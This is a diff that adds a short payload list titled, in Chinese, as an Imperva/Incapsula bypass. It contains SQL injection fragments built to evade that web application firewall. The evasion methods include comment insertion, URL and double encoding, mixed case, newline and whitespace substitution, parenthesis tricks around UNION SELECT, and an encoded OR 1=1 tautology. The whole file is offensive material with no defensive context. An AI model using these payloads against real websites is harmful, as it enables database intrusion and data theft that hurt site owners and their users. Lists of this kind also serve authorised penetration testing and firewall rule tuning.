@@ -1,0 +1,31 @@
+# Imperva/Incapsula 绕过
+# 注释变体
+/**/UNION/**/SELECT
+/*!00000UNION*//*!00000SELECT*/
+/*--*/UNION/*--*/SELECT
+
+# 编码
+%55%4e%49%4f%4e %53%45%4c%45%43%54
+%2f%2a%2a%2fUNION%2f%2a%2a%2fSELECT
+
+# 大小写
+uNiOn SeLeCt
+UnIoN sElEcT
+
+# 换行
+UNION%0aSELECT
+UNION%0dSELECT
+
+# 空格
+UNION%09SELECT
+UNION%0bSELECT
+UNION%0cSELECT
+UNION%a0SELECT
+
+# 双重编码
+%252f%252a*/UNION%252f%252a*/SELECT
+%2527 OR 1=1--
+
+# 特殊
+UNION(SELECT(1))
+(UNION)(SELECT)(1)
